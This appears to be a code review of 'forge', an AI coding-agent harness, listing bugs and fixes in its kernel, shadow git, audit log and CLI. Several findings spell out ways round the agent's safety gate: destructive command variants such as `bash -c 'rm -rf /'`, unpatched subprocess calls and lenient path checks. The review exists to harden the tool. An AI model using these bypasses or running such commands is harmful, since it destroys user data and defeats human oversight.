findings.title: _run_skill injects kwargs via repr() into kernel code — string injection / NameError on non-trivial values
findings.detail: _run_skill builds a bootstrap string with `f"_main(**{kwargs!r}) if _main else None"`. repr() of arbitrary kwargs is then eval'd inside the kernel. A kwarg whose repr is not a Python literal (e.g. a custom object, a Path, a datetime, a numpy array) will produce a NameError or worse, syntax errors. Strings with single quotes inside also break the surrounding quotes for helpers_path: `spec_from_file_location('skills.x', '{skill.helpers_path}')` — any apostrophe or backslash in the path (Windows, names with quotes) breaks the cell. Also `kwargs!r` of a dict with non-repr-roundtrippable values silently fails.
findings.suggested_fix: Pass kwargs via JSON to a stdin-fed message or set them on the kernel namespace through a direct API rather than string-formatting Python code. At minimum json.dumps the kwargs and json.loads inside the bootstrap; quote helpers_path with repr() not raw f-string interpolation.

findings.title: format_retries counter is never reset across cells in a turn — false escalation after legitimate cells
findings.detail: format_retries is initialized once at the top of turn(). It is incremented on each empty-content retry AND on each parse-problem retry, and is never reset after a successful cell. A turn that runs three normal cells, then later produces one parse-error response, will trip max_format_retries even though only one retry has occurred for that bad response. Cumulative across a single turn, this misclassifies normal long sessions as 'format failure'.
findings.suggested_fix: Reset format_retries to 0 after a successful gate ALLOW that produced a cell (before continuing the loop). Or scope the counter per failure type/per attempted cell.

findings.title: Shadow pre-commit happens even if cell ultimately fails parsing/execution; post commit is skipped on exception, leaving turn state inconsistent
findings.detail: self.shadow.commit(...) is called for pre-commit, then self.kernel.execute(...). If kernel.execute raises (it can, on send_signal/etc.) or shadow.commit raises (subprocess.CalledProcessError from inside _git when nothing matches the 'nothing to commit' branch), the post-commit is skipped, the audit log entry is skipped, history isn't updated with an Observation, and the next loop iteration sends the model the assistant message with no observation reply, breaking the conversation invariant. Also: shadow.commit can raise on disk full / git lock contention because `_git(*args, check=True)` re-raises anything that isn't 'nothing to commit'.
findings.suggested_fix: Wrap pre-commit, execute, and post-commit in try/finally; ensure an Observation is always appended to history (even a synthetic 'cell crashed' one) and post-commit attempted even after execute exception. Catch CalledProcessError in shadow.commit and surface as None+log rather than re-raise.

findings.title: stderr drainer thread races with stop()/restart and reads from a closed pipe; unbounded buffer trim loses ordering for diagnostics
findings.detail: _drain_stderr captures self.proc and self.proc.stderr at thread start, but when stop() reassigns self.proc=None and the next start() spawns a new Popen, the daemon drainer thread is still iterating over the old pipe (and a new drainer is started for the new proc). This double-drainer scenario is unbounded over kernel restarts. Also, the trim `self._stderr_buf = self._stderr_buf[-500:]` runs without a lock — concurrent reads in execute()'s stderr buffer formatting (`''.join(self._stderr_buf[-20:])`) can observe a list mid-replace. There is no .join() on stop() either, so on session close, the drainer can keep running on a half-closed FD.
findings.suggested_fix: Bind the drainer to a specific Popen+stderr handle (closure variable) so it exits cleanly when that pipe closes; track the thread and join with timeout in stop(); use a lock or collections.deque(maxlen=1000) for the stderr buffer.

findings.title: Cell timeout sends SIGTERM but does not wait or kill — kernel left in undefined state for next cell
findings.detail: On timeout, kernel.execute does `self.proc.send_signal(signal.SIGTERM)` and returns. It does not wait for the process to terminate, doesn't call kill if the worker ignores SIGTERM, and doesn't reset self.proc to None. The next call to execute() does `self.proc.poll() is not None` to decide whether to restart — but a worker that received SIGTERM and is still running an infinite loop (e.g. cell did `while True: pass`) will return None, and the kernel will write a new exec command into a stdin that the worker is no longer reading. Result: deadlock or stale results from the prior cell consumed as if for the next.
findings.suggested_fix: After SIGTERM, wait(timeout=2); on TimeoutExpired call kill(); set self.proc=None unconditionally on timeout so the next execute() spawns a fresh worker. Also drain any pending stdout to avoid the next call reading the old cell's late result.

findings.title: select() loop on text-mode pipe may block on partial line / be non-portable on Windows
findings.detail: self.proc.stdout is opened in text mode (text=True). select.select() works on the underlying fd but readline() in text mode can buffer beyond what select reported as ready, causing the loop to block on readline waiting for the rest of a line. Also, select() does not work on pipes on Windows. While the code path is presumably POSIX-only for now, there is no guard. A cell producing gigabytes of stdout will fill the pipe buffer (~64KB on linux), the worker will block on write, and the orchestrator's readline will only consume one line at a time — so a cell that prints 1GB without newlines will deadlock both processes.
findings.suggested_fix: Use binary mode + a manual line-buffer; or read in chunks and split on the marker prefix. Add a per-cell stdout cap enforced inside the worker (e.g. truncate stdout to N MB) before _emit_result. Document POSIX-only or guard on platform.

findings.title: Kernel reset() can lose builtins/__name__ if cell mutated them; drops references to currently-imported modules
findings.detail: On reset, GLOBALS.clear() is called and re-populated. But `__builtins__` is captured at module import time of the worker. If a cell did `import builtins; builtins.print = something`, that mutation persists across reset (because the reset just restores the reference to the module). More subtly, sys.modules is shared and accumulates from cells; reset doesn't clear it, so `import skills.x` from a prior cell still resolves to the old module after reset. The 'reset' is misleadingly partial.
findings.suggested_fix: Document reset() as 'globals only'; provide a hard-reset that respawns the worker subprocess. Optionally clear sys.modules entries beyond a startup snapshot.

findings.title: Audit log opens/closes file per write — concurrent processes can interleave a partial line; no fsync; growing without bound
findings.detail: AuditLog.write opens the file in 'a' mode and writes (line + '\n'). On POSIX, append-mode writes are atomic for a single write() call only when the data is <= PIPE_BUF (~4096). A long JSON line plus newline emitted as a single Python file.write() may translate to multiple write() syscalls under buffering, so two sessions writing concurrently can interleave. Even within a single process, no flush/fsync means a crash mid-write leaves a partial JSONL line that breaks tail()/find(). And there is no rotation: tail() reads the whole file; in long-running workspaces the file will hit hundreds of MB and tail will load it fully.
findings.suggested_fix: Open with `with self.path.open('ab')` (binary), encode the JSON+newline as bytes, write in one call, and call os.fsync. Use fcntl.flock on POSIX for cross-process safety. Implement size-based rotation (e.g. >32MB rotate to .1) and make tail() seek from end rather than read the whole file.

findings.title: session_log monkey-patches AuditLog.write — not thread-safe and leaks if exception propagates from an outer monkey-patch
findings.detail: session_log replaces audit.write on the instance for the lifetime of the with-block. If two contexts run concurrently (multiple sessions sharing one AuditLog), one's exit will restore the wrong original. Also, if a caller patches further inside the block (chained sessions), the inner __exit__ restores 'original' which itself is a wrapper, leaving the outer scope still wrapped on second exit — easy stack confusion. If audit.write is replaced and an exception fires before audit.write is reassigned, the finally block restores correctly only if the wrapper instance still has the attribute.
findings.suggested_fix: Don't monkey-patch. Either pass session_id explicitly to write(), or return a thin per-session wrapper object that holds the session_id in its closure and delegates to the underlying log.

findings.title: Provider failures retry with no backoff and the empty-content case is not treated as a retry candidate
findings.detail: The for-loop over attempt_models retries on any exception immediately, with no backoff. A 500 from Ollama in a tight loop hammers the server. More importantly, an empty content response (Completion.empty) is not a network failure — it's a successful HTTP 200 with content='', and the loop returns it immediately. The session.turn() empty-retry only retries the same model with a reminder; it does not escalate to a different model. Combined with the check `if completion.empty: if format_retries < 1: format_retries += 1`, the empty-retry can loop only once, then immediately exits with 'empty response' even when escalation candidates exist.
findings.suggested_fix: Add exponential backoff between provider attempts. Treat empty content as a retryable failure within the router (try next model in escalation chain). In session.turn(), allow empty-retry to trigger escalation rather than incrementing the same shared format_retries.

findings.title: max_tokens cutoff produces silent truncation; finish_reason='length' not surfaced to caller / session
findings.detail: complete() captures finish_reason but does not act on it. When the model hits max_tokens=2048, the response is truncated mid-cell. Session.turn() then parses this truncated text — typically a half-formed code fence — and gate.check returns DENY with parse_problems. format_retries increments, the model regenerates the same partial output, and after max_format_retries the turn fails with no indication that the real cause was max_tokens. There is also no enforcement of cost ceiling per call (only per session), so a single cell could blow past the budget mid-call.
findings.suggested_fix: When finish_reason == 'length', either auto-continue the assistant message with another call (continue-on-truncation) or surface a specific parse_problem 'truncated_by_max_tokens' so the user/agent sees the actual cause. Per-call projected cost check can also be added.

findings.title: Session._history grows unbounded — no truncation; will exceed model context after a few turns
findings.detail: Every user msg, assistant completion, and observation is appended to self._history. Observations include up to 4000 chars of stdout/stderr per cell, and the loop can run 12 cells per turn. After even a handful of turns the history will exceed the 16k–32k context window of gpt-oss:20b, and the router will pass it through unchanged. Ollama either drops messages silently or errors. There is no summarization or sliding window despite the 'summarizer' role being defined.
findings.suggested_fix: Implement a context-window manager: token-count messages, drop or summarize oldest non-system entries when approaching cfg.num_ctx * 0.8. Trim observation chars more aggressively per turn. The existing summarizer role is the right primitive — wire it.

findings.title: shadow.commit ambiguous when allow_empty=False — the 'nothing to commit' string-match is locale-dependent
findings.detail: commit() detects 'nothing to commit' by substring matching git's stdout/stderr. Git output is locale-dependent. On a system with LC_ALL=de_DE.UTF-8, the message is in German ('nichts zu committen'). The substring check fails, the CalledProcessError is re-raised, and commit() crashes the turn unnecessarily. Also `flag = '--allow-empty' if allow_empty else ''` then `if flag: args.append(flag)` always appends in the only call site that uses allow_empty=True, so the False branch (rebuilt from caller) hits the locale issue.
findings.suggested_fix: Force LC_ALL=C in subprocess env when calling git, or use `git commit --porcelain` / check the working tree status before commit. Use `--allow-empty` always to avoid the failure path entirely if exact emptiness doesn't matter.

findings.title: Shadow git ignores nested .git directories and large/binary files — auto `git add -A` will swallow node_modules / .venv / huge artifacts
findings.detail: init() writes a small .gitignore listing only `.forge/`, `__pycache__/`, `*.pyc`, `.DS_Store`. It does not honor the workspace's actual .gitignore (`core.excludesfile` points at .forge/.gitignore which only contains those four patterns). So `git add -A` will stage node_modules, .venv, build artifacts, multi-GB binaries, secrets in .env, etc. Each cell shadow commit will be huge and slow, and commit messages reference 'forge:pre cell N — ...' meaning every checkpoint snapshots gigabytes. On nested git submodules, git add -A will refuse and bubble an error.
findings.suggested_fix: Set core.excludesfile to point at the workspace's .gitignore (or merge it into the shadow's exclude). Alternatively, run `git ls-files --exclude-from=.gitignore` style logic. Explicitly handle nested .git directories with `--ignore-submodules`. Add a maximum-blob-size guard.

findings.title: undo_last and reset_to use `checkout <sha> -- .` which doesn't remove files added by the undone commit
findings.detail: The docstring says 'reset doesn't remove untracked-then-tracked files cleanly,' but the chosen `git checkout <target> -- .` only restores tracked-at-target files. Files added by the undone commit (which existed at HEAD but not at target) remain on disk after undo. The follow-up `self.commit(...)` snapshots the current state and won't delete anything because git add -A doesn't remove files that exist on disk but aren't in the target tree. So undo silently leaves orphans.
findings.suggested_fix: Use `git read-tree --reset -u <sha>` against the work-tree, or follow checkout with `git clean -fd` to remove files not in the index. Test with: create file, commit, then undo — file should not exist after.

findings.title: _git() runs with text=True default encoding — non-utf8 file contents in `git show` / `git log` will UnicodeDecodeError
findings.detail: subprocess.run is called with text=True and no explicit encoding/errors. On macOS/Linux this defaults to utf-8 strict. A workspace containing files with mixed encodings (legacy code, binary blobs displayed by `git show -p`) will raise UnicodeDecodeError when reading stdout for log/show, killing the CLI command.
findings.suggested_fix: Pass `errors='replace'` (or encoding='utf-8', errors='replace') to subprocess.run. For show specifically, consider returning bytes for binary diffs.

findings.title: json.dumps with default=str + ensure_ascii=False can emit embedded newlines in strings (multi-line tracebacks) — JSONL invariant broken
findings.detail: json.dumps escapes literal newlines inside strings as \n, so this is fine — UNLESS a non-string field is serialized via default=str. e.g. an exception traceback object string-coerced may contain literal '\r' or other control chars. Actually, json.dumps on the output of default=str re-escapes; this is actually safe. However ensure_ascii=False allows U+2028/U+2029 line separators which are valid JSON but are line terminators in many readers (and some JSONL parsers split on them). tail() uses str.splitlines() which DOES split on U+2028, breaking entries.
findings.suggested_fix: Either use ensure_ascii=True to escape line separators, or replace splitlines() with split('\n') in tail/find for stable JSONL parsing.

findings.title: --version triggers ensure_dirs side effect and creates ~/.forge even if user only wants version
findings.detail: The root callback runs before the eager --version handler dispatches (typer evaluates eager flags but the callback body still runs). Actually, is_eager=True ensures the option is parsed before subcommand dispatch, but the callback body itself executes for every invocation — and `forge` with no args lands in the same callback. While _root itself doesn't call ensure_dirs, the @app.command run/chat/log/etc do. More importantly: piping `forge log -n 1000 | head` will EPIPE when head closes; rich.Console doesn't handle BrokenPipeError gracefully and will dump a stacktrace.
findings.suggested_fix: In cli.py, install a signal handler / wrap top-level main with `try: app() except BrokenPipeError: sys.exit(0)`. Have rich Console use a StreamHandler with safe writes.

findings.title: chat command has no detection for non-TTY stdin — console.input on a closed/non-interactive stdin spins
findings.detail: When `forge chat` is run via `forge chat < script.txt` or in a CI environment, console.input() reads lines but if stdin is closed it raises EOFError once and exits — fine. But if stdin is a non-TTY pipe with no newline-terminated input, console.input may block forever waiting on input. There's no check for `sys.stdin.isatty()` before entering the loop, and no way to feed a single command and exit cleanly. Combined with the broken-pipe issue on stdout, scripted use is broken.
findings.suggested_fix: If `not sys.stdin.isatty()` in chat mode, require explicit --auto or fall through to a script-friendly mode. Or detect EOFError on first read and exit cleanly with a message.

findings.title: render_for_system_prompt off-by-one: budget computed in 'used chars' compared to cap*4 but estimated tokens already use chars-as-tokens
findings.detail: Comment says 'tokens are ~4 chars' so the cap*4 char budget is correct. But the truncation message references `len(self.skills) - len(lines) + 4` which is wrong: lines includes the 4 header lines, so `len(self.skills) - (len(lines) - 4)` would be the count of remaining skills. As written, when 10 skills fit out of 100, lines=14 and the message says '90 more' instead of 86. Minor numeric bug, but visible to the model.
findings.suggested_fix: Track skills_added separately; render `len(self.skills) - skills_added` for the 'and N more' tail.

findings.title: discover_skills only recurses two levels — pinned skills nested >2 deep silently invisible; no symlink loop guard
findings.detail: discover_skills handles the `<source>/<skill>/SKILL.md` case but not `<source>/<provider>/<skill>/SKILL.md` (three levels). Pinned installs from common skill marketplaces use deeper paths. Also iterdir() on a path containing a symlink loop will recurse but, since recursion is bounded to two levels, won't hang — but a symlink to a non-existent target will raise OSError and abort the entire scan, causing zero skills to load.
findings.suggested_fix: Walk subtrees with rglob('SKILL.md') with a max depth and a visited-set; skip on PermissionError/OSError per-entry. Cap at 1000 skills to bound the work.

findings.title: install_builtin_guards patches subprocess.run but cells often call subprocess.Popen / check_output / call directly — bypass
findings.detail: Only subprocess.run is patched. A cell or skill helper that uses subprocess.Popen, subprocess.check_output, subprocess.call, subprocess.check_call, or os.system bypasses the protected-action check entirely. Same for builtins.open: open() is patched but `os.open()` and `pathlib.Path.write_text` (which uses io.open) and `io.open` are not. Pathlib uses `open()` via io._open which is itself patched in CPython, but `os.open()` is a syscall wrapper that goes through fd APIs that aren't checked.
findings.suggested_fix: Patch subprocess.Popen (which all the others delegate to). Add os.open guard. Document that `os.system` bypasses, or patch it too.

findings.title: Timestamp uses second resolution — events in the same second sort non-deterministically by record
findings.detail: time.strftime('%Y-%m-%dT%H:%M:%SZ') has 1-second granularity. cell.exec, post-commit, observation events all happen within the same second and become indistinguishable for replay/debug. Combined with no explicit sequence number, ordering is fragile.
findings.suggested_fix: Use ISO 8601 with milliseconds (e.g. via datetime.utcnow().isoformat(timespec='milliseconds')+'Z') and/or add a monotonic seq field.

findings.title: Cost-spent reset is only via init — no way to reset within a long-running session even though error message references `forge cost reset`
findings.detail: The CostCeilingExceeded error references `forge cost reset` but there is no such CLI command (cli.py defines `forge cost` for read-only summary only). The user gets an error pointing to a non-existent command.
findings.suggested_fix: Implement `forge cost reset` to zero out spent_usd in the active session, or remove the misleading reference.

findings.title: Worker stdin write can block if cell command exceeds OS pipe buffer for extremely large `code` payloads
findings.detail: self.proc.stdin.write(cmd + '\n') is a blocking write. A cell containing a very large embedded data literal (multi-MB payload) plus the JSON wrapper might exceed the kernel's pipe buffer. If the worker is slow to read (because it's still finishing the previous cell or busy), this write deadlocks the orchestrator, which is then waiting on stdin.write while the worker waits on stdout.write of the result — classic pipe deadlock.
findings.suggested_fix: Cap cell code size before sending; or use a larger framing (e.g. write to a temp file and have the worker read from disk). At minimum, set a stdin write timeout.

findings.title: BaseException catch swallows KeyboardInterrupt inside the worker — Ctrl-C from the orchestrator's signal forwarding never propagates
findings.detail: The `except BaseException` in the worker catches KeyboardInterrupt and SystemExit, formatting them into stderr. SystemExit is handled separately above; KeyboardInterrupt would be turned into a normal failed cell. If the orchestrator wants to interrupt a long-running cell via SIGINT, the worker swallows it, sets ok=False, and continues to the next cell — meaning the user's Ctrl-C only stops one cell, not the kernel. Combined with the timeout path that doesn't actually kill, interactive interrupts feel unresponsive.
findings.suggested_fix: Catch Exception (not BaseException), or re-raise KeyboardInterrupt/SystemExit after logging. Wire the orchestrator's KeyboardInterrupt to send SIGINT to the worker process group.

findings.title: Module-level mutable globals (_FIND_SKILL/_RUN_SKILL/_SEE) make tools.py a singleton
findings.detail: find_skill / run_skill / see are wired through module-level mutable globals that get mutated by Session.start() via set_skill_runtime(). This is a classic service-locator anti-pattern: it makes Session non-isolatable (two Sessions in one process clobber each other's runtime), tests have to remember to tear it down, and the dependency graph is invisible. Comment in session.py says 'This is the ONLY place set_skill_runtime is called - anything else is a bug' which is itself an admission that the design relies on social contract instead of types. There is no test that two concurrent Session lifetimes don't trample each other, and no test that close() restores the stubs.
findings.suggested_fix: Pass the SkillRuntime as an explicit parameter into kernel_globals(runtime=...) and inject the bound functions into the kernel namespace at start() time. Eliminate the module-level _FIND_SKILL/_RUN_SKILL/_SEE entirely. If you must keep a default no-op, model it as a SkillRuntime dataclass and inject by reference, not by mutating module state.

findings.title: _run_skill builds Python source via f-string interpolation of arbitrary kwargs and a path
findings.detail: _run_skill formats `{kwargs!r}` and `{skill.helpers_path}` directly into a Python source string passed to kernel.execute(). repr() is not safe Python source for arbitrary objects (custom __repr__ can produce non-quoted output, datetime.datetime(...) is fine but file paths with backslashes/quotes are not, and dataclasses with non-quoted reprs become syntax errors). A skill name containing characters that survive .replace('-', '_') (digits, dots) plus a path with an apostrophe will produce broken or injectable code. Even within trust-mode the bug surface is large.
findings.suggested_fix: Stop generating Python source. Either (a) load the helpers module in the parent process and call main(**kwargs) directly, returning the value to the kernel by stashing into kernel globals via a new exec-with-locals API, or (b) JSON-encode kwargs and the path, and have a kernel-side `_forge_run_skill(name, kwargs_json, path)` helper read them. Treat any hand-rolled code-gen of Python source as a smell.

findings.title: _path_covers is so lenient it neutralizes the gate for any unresolved variable
findings.detail: The trailing branch `if actual.replace('_', '').isalpha() and len(actual) < 30: return True` says 'if AST couldn't resolve the path and it looks like a variable name, trust the declaration.' This means any cell that opens a file via a function-arg, return-value, or attribute access produces an actual write target that's just an identifier - which the gate then unconditionally allows. The comment frames this as 'trust the declaration', but combined with `actual.endswith(d) or d.endswith(actual)` (any common suffix matches!) the path-cover logic becomes dangerously permissive. Tests only exercise canonical literal paths.
findings.suggested_fix: Drop the 'looks like a variable name' bypass. If the AST can't resolve the target, escalate to confirm rather than allow - the user is the right place to decide. Also tighten _path_covers: replace the bidirectional endswith check with a strict prefix/glob test. Add a regression test for `Write(self.cfg.path, x)` where the receiver is unresolvable.

findings.title: Protected-action substring check is trivially bypassable
findings.detail: _bash_command_is_protected normalizes whitespace then does a literal `pat in norm` substring check. Patterns include `git push --force` and `rm -rf /`. Variants that bypass: tab characters between args (only collapsed because re.sub(r'\s+', ' ') runs first - OK), but also `git -C . push --force` (no longer contains the substring `git push`), `eval $(echo rm -rf /)`, `bash -c 'rm -rf /'`, `\rm -rf /` (backslash-prefixed), env-prefixed `FOO=1 sudo whoami`, or shell expansion `r'm' -rf /`. The docstring waves this away as 'adversarial bypasses are NOT in scope for trust mode' but the README sells protected-actions as a defense layer in the safety table.
findings.suggested_fix: Either move protected actions to argv-level inspection (parse the cmd via shlex, walk pipelines/subshells), or be explicit in README that protected actions are an honest-mistake guardrail, not an adversarial defense. Right now the safety story oversells what the code does.

findings.title: Zero CLI tests; InteractiveSession._confirm flow is completely untested
findings.detail: There is no tests/test_cli.py. Every Typer command (run, chat, log, undo, show, cost, doctor, skill list, skill show, reset-kernel) ships uncovered. InteractiveSession overrides _confirm to render a Rich panel and call typer.confirm - this is the entire interactive safety UX, never exercised. The chat REPL's slash-command parser (/exit, /undo, /cost, /reset) is also uncovered. _do_undo's empty-shadow branch and the doctor command's HTTP probes are uncovered. A behavior change here would silently break user-visible safety prompts.
findings.suggested_fix: Add tests/test_cli.py using typer.testing.CliRunner. Mock Session at the module boundary and assert: (a) run with --auto uses Session not InteractiveSession; (b) chat /undo, /cost, /reset, /exit each dispatch correctly; (c) InteractiveSession._confirm shows the right reasons and returns False when typer.confirm is no-input. Add a test that doctor's failure path exits non-zero.

findings.title: Session.turn is a 135-line method mixing 6 concerns
findings.detail: turn() does: history mutation, model call, cost tracking, empty-content recovery, gate parse-failure recovery, gate confirmation flow, shadow commits, kernel exec, observation rendering, audit logging, kernel-wedge detection, and max-cells exit. Each branch returns from the middle of the loop, and the audit-log session_log monkey-patches audit.write for the duration. State changes are entangled: format_retries is for both empty-content (uses ==1) and parse failures (uses max_format_retries) but is the same counter, so an empty-content retry consumes a parse-failure budget. There's no abstraction for 'one cell pass' that a unit test could target.
findings.suggested_fix: Extract: _handle_empty_completion(), _handle_format_failure(), _handle_gate_decision() -> Optional[Outcome], _execute_cell(). Use separate counters for empty-content retries vs format retries. Replace audit.write monkey-patching with a SessionLogger wrapper class.

findings.title: session_log monkey-patches audit.write — not thread-safe, breaks if exception leaks
findings.detail: session_log replaces audit.write with a closure for the duration of a `with` block. If any code anywhere captures a reference to audit.write outside the block (e.g., another thread, or a lazy logger), it sees the wrong implementation. If a finalizer fires inside the with-block and the finally-restore runs but a background task already grabbed the wrapped function, the session_id leaks. The comment 'much less code than a full proxy class' is a classic 'simple now, painful later'.
findings.suggested_fix: Replace with a small wrapper class: SessionLog(audit, session_id) that exposes write(kind, **fields) and forwards to audit.write with session injected. Five lines of code, zero monkey-patching, thread-safe.

findings.title: PROTECTED_PATHS / PROTECTED_ACTIONS are tuples in code, not config
findings.detail: The README and tools.py docstrings claim users can 'edit ~/.forge/protected_paths.yaml — the agent itself cannot bypass this'. No such loading exists. Both lists are hardcoded constants. Adding a path means a code edit and reinstall. The error message in tools.assert_writable lies: it tells the user to edit a yaml that has no effect. Also, this means a security advisory adding a new protected path requires a release rather than a config push.
findings.suggested_fix: Implement the documented behavior: load ~/.forge/protected_paths.yaml and ~/.forge/protected_actions.yaml at config import (or first use), merging with the hardcoded baseline. The hardcoded list stays the floor; the yaml can only ADD, never remove. Document explicitly that the yaml is loaded read-only and not editable from inside an agent cell (it is, since ~/.forge is itself protected — good).

findings.title: Doc rot: README links to docs/SAFETY.md which does not exist
findings.detail: README claims 'See docs/SAFETY.md for the full threat model.' The docs/ directory is empty. The user-facing safety story therefore ends at a 404. Also, README's quick start section says `forge run` accepts a task as a positional arg but doesn't mention --auto vs interactive default behavior. The user task description specifically calls out 'no THREAT_MODEL.md actually written'.
findings.suggested_fix: Either write docs/SAFETY.md (threats, mitigations, what's NOT defended, what trust-mode means in concrete terms) or remove the link until it exists. Also document the auto/interactive default in README. The honest-roadmap framing the README otherwise has is undermined by this single dangling link.

findings.title: Hardcoded model pricing table will silently go stale
findings.detail: _PRICING is a dict literal with `claude-sonnet-4-6`, `claude-opus-4-8`, `gpt-5` rates. Models not in the dict get $0 cost (default tuple), so any new model the user routes to will under-report spend, including the cost-ceiling check that's load-bearing for budget control. There's no warning, no test that 'unknown model defaults to $0', and no mechanism to update the table without a code change.
findings.suggested_fix: Move pricing to ~/.forge/pricing.yaml with the hardcoded fallback. Log a warning when a model has no entry. Add a test asserting unknown-model behavior. Better: integrate with LiteLLM's pricing data which is already maintained.

findings.title: eager_token_cap math is wrong and the truncation message will misreport
findings.detail: The check is `if used + len(line) > self.eager_token_cap * 4` — a token is approximately 4 chars, so eager_token_cap=5000 should mean ~5000 tokens ≈ 20000 chars; the multiplication is right but the code measures `used` in chars and compares to chars. Comment says 'Naive char-as-tokens estimate. Conservative — tokens are ~4 chars' which contradicts the code (code is the OPPOSITE of conservative — it lets you spend 4× the cap). The truncation line `... and {len(self.skills) - len(lines) + 4} more` mixes lines vs. skills counts: lines includes 4 header lines, so the off-by-N is wrong when truncation actually fires.
findings.suggested_fix: Pick a unit and stick with it. If eager_token_cap is in tokens, divide chars by 4 when comparing. Track the index of the last appended skill and compute `len(skills) - idx - 1` for the 'and N more' message. Add a regression test: 200 fake skills, eager_token_cap=1000, assert truncation message is correct.

findings.title: Chat REPL: no streaming, no multi-line input, no history, no edit
findings.detail: console.input() is a single-line prompt. Users cannot paste a multi-line task description. There's no readline integration (no up-arrow history, no Ctrl-R search, no Ctrl-A/E). There's no streaming of model output — the user stares at a blocked TTY for the entire turn (which on local Ollama can be 10-60s). Output formatting is also inconsistent: `forge run` prints the result_panel only if final_text exists; chat always prints it (with '(no reply)' fallback). KeyboardInterrupt during turn() leaves history mutated (the user's message is in history but no assistant response).
findings.suggested_fix: Adopt prompt_toolkit for chat (multi-line, history, completion, slash-command palette). Stream completions through router.complete() yielding chunks; update a Rich Live display. On KeyboardInterrupt, pop the user's last message from history so the next turn starts clean.

findings.title: `forge reset-kernel` is a documented command that's a pure no-op
findings.detail: The docstring at the top of cli.py advertises `forge reset-kernel` as a way to clear kernel globals 'when state has rotted', but the implementation prints 'reset-kernel is a no-op outside a live chat session' and exits. Users will run this after seeing the kernel.wedged error message ('Try `forge reset-kernel`') from session.py, get a no-op message, and be confused. The wedged-kernel error message points users to a non-functional command.
findings.suggested_fix: Either (a) implement reset-kernel for the next-launched session via a sentinel file the Session reads on start(), or (b) remove it from the CLI and update the kernel.wedged message to say 'restart your chat / re-run forge run'. Right now both code paths lie to the user.

findings.title: Session has too many responsibilities and unbounded history growth
findings.detail: Session owns the kernel, shadow git, audit log, router, skills registry, system prompt, and conversation history list. _history is appended to forever — there's no truncation, no summarization. After a few turns on a real model the prompt will exceed num_ctx (default 16384) and the request will fail or the head will be dropped silently by Ollama. The roadmap mentions a 'summarizer' role with effort=low but it is wired into roles and never actually called. The system prompt summarizer hook is missing.
findings.suggested_fix: Add HistoryBuffer with token-based truncation: when above N tokens, summarize older turns via the summarizer role and replace them with a single system 'context summary' message. Add a test that long sessions don't exceed num_ctx. Also extract Session into a thinner orchestrator that holds collaborators by interface.

findings.title: No test exercises Session.turn end-to-end with a fake model
findings.detail: The largest, riskiest object in the codebase has zero tests. There's no FakeRouter, no sequence-of-completions stub, no test of: format-retry on missing intent fence, gate-deny then deny again hitting max_format_retries, gate-confirm in interactive vs auto mode, max_cells_per_turn cap, kernel-wedge during a turn, cost ceiling triggering mid-turn. The orchestration logic has 12 distinct branches and 1 of them (basic prose-only end) is even informally exercised. session_id determinism, history-after-failure, observation truncation in obs.format() — all uncovered.
findings.suggested_fix: Add tests/test_session.py with a FakeRouter that yields a scripted list of Completion objects. Cover: prose end, format-retry succeeds, format-retry exhausted, undeclared-write deny in auto, undeclared-write confirm-yes / confirm-no in interactive, max_cells_per_turn, cost ceiling exceeded, kernel wedged. This is the highest-value test suite to add.

findings.title: Edit error 'old string is not unique' tells you the count but not where
findings.detail: When Edit fails because the `old` string occurs N times, the message says only `old string is not unique in {path} ({n} matches)`. It doesn't show the line numbers, and it doesn't show even one occurrence of context. The agent then has to do another Read + count to figure out which is which. Same for the 'old string not found' branch — no fuzzy hint, no near-miss suggestion. This is a quality-of-error issue that compounds: every failed Edit costs another round-trip.
findings.suggested_fix: On not-found, find the closest matching substring via difflib and surface it ('did you mean: ...'). On not-unique, show the line numbers of all matches. Both cases consume cheap CPU and save expensive model calls.

findings.title: Cell timeout sends SIGTERM but doesn't restart kernel; subsequent cells will hang
findings.detail: On timeout, kernel.execute() does `self.proc.send_signal(signal.SIGTERM)` and returns an Observation. But it doesn't set self.proc=None, doesn't wait, doesn't restart. The next call to execute() checks `self.proc.poll() is not None` — but if the worker is still terminating gracefully (still in the post-SIGTERM grace period) poll() may return None and we'll write a command into a dying process's stdin. There's also no SIGKILL fallback; if the cell is stuck in C code or a non-Python sleep, SIGTERM may be ignored.
findings.suggested_fix: After SIGTERM, wait briefly, then SIGKILL on timeout. Mark proc as dead. On next execute(), restart cleanly. Also add a test: kernel.execute('while True: pass', timeout=1) returns ok=False; the next execute('print("ok")') succeeds.

findings.title: undo_last cannot undo file creations and silently leaves them in place
findings.detail: undo_last uses `git checkout HEAD~1 -- .` which restores tracked files to a previous state but does NOT remove files that were newly created in the just-undone commit. The comment in the code acknowledges this and says 'Files that were created by the undone commit are now deleted from the index; clean them up' — but the next line just commits the current state, leaving the newly-created (and now untracked from shadow's POV) files on disk. After `forge undo`, a user who expected the cell that did `Write('out.csv', ...)` to be reverted will still find out.csv on disk.
findings.suggested_fix: After `git checkout target.sha -- .`, run `git diff --diff-filter=A --name-only target.sha HEAD~0` to find files added between target and the original HEAD, and `os.unlink` them. Add a test: undo_last() after a Write() removes the new file from the workspace.

findings.title: find() returns list[dict[str, Any]] - lossy, untyped
findings.detail: Public API returns dicts with keys 'name', 'description', 'score'. Callers (run_skill agent emitter) cannot navigate to the Skill object without going back to the registry. find_skill() in tools.py is typed list[dict[str, Any]]. Pydantic + dataclass are already in use elsewhere — a SearchHit model would be one line and would let IDEs autocomplete, surface typos, and make the model's expected response shape concrete in tests.
findings.suggested_fix: Define SearchHit(BaseModel) with name, description, score, path. Update find() to return list[SearchHit] and serialize to dict only at the JSON boundary. Same treatment for kernel_globals().

findings.title: _confirm has parameter typed as `object` to dodge a circular hint
findings.detail: `def _confirm(self, gate: object) -> bool` — and InteractiveSession overrides it with `gate: GateDecision` and a `# type: ignore[override]`. The base class is hiding from a perfectly importable type. Symptom of a bigger pattern: lots of `object`/`Any` in this codebase where a concrete type would do (TurnResult.observations, kernel_globals return, audit.find return, audit fields=Any). Hides bugs.
findings.suggested_fix: Type _confirm(gate: GateDecision) -> bool. Audit `Any` in the codebase: tests/grep `: Any` and tighten where the union is finite. The pydantic models already give you the shape for free.

findings.title: Gate AST tests pin exact tuple shape — they test implementation, not contract
findings.detail: test_ast_finds_simple_write asserts `("Write", "foo.txt") in f.write_calls`. The contract callers care about is 'analyze() detected a write to foo.txt'. By pinning the tuple's first element to the source-of-call ('Write' vs 'open' vs 'Bash:redirect'), every refactor of how analyze() labels findings breaks tests. Same in test_ast_finds_open_write_mode, test_ast_finds_path_rename. The tests are strong but are guarding the wrong invariant.
